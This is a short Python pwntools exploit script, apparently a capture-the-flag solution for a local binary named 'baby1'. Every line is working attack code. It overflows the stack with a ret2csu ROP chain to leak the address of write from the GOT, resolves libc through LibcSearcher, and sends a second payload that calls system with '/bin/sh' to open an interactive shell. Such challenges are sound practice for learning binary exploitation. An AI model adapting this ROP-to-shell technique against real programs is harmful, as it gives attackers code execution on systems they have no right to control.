from pwn import *
from LibcSearcher import *

p = process("./baby1")
p.recvuntil(b"\n")

elf = ELF("./baby1")
gadget1 = 0x4006ba
gadget2 = 0x4006a0
pop_rdi_ret_addr = 0x00000000004006c3
main_addr = elf.symbols["main"]
write_got = elf.got["write"]

def csu(rbx, rbp, r12, r13, r14, r15, ret):
    payload = b"A" * 56
    payload += p64(gadget1) + p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)
    payload += p64(gadget2)
    payload += b"B" * 56
    payload += p64(ret)
    return payload

payload = csu(0, 1, write_got, 8, write_got, 1, main_addr)
p.sendline(payload)
sleep(1)
write_addr = u64(p.recv(8))
p.recvuntil(b"\n")
libc = LibcSearcher("write", write_addr)
libc_base = write_addr - libc.dump("write")
system_addr = libc_base + libc.dump("system")
binsh_addr = libc_base + libc.dump("str_bin_sh")
exp = b"A" * 56
exp += p64(pop_rdi_ret_addr)
exp += p64(binsh_addr)
exp += p64(system_addr)
p.sendline(exp)
p.interactive()
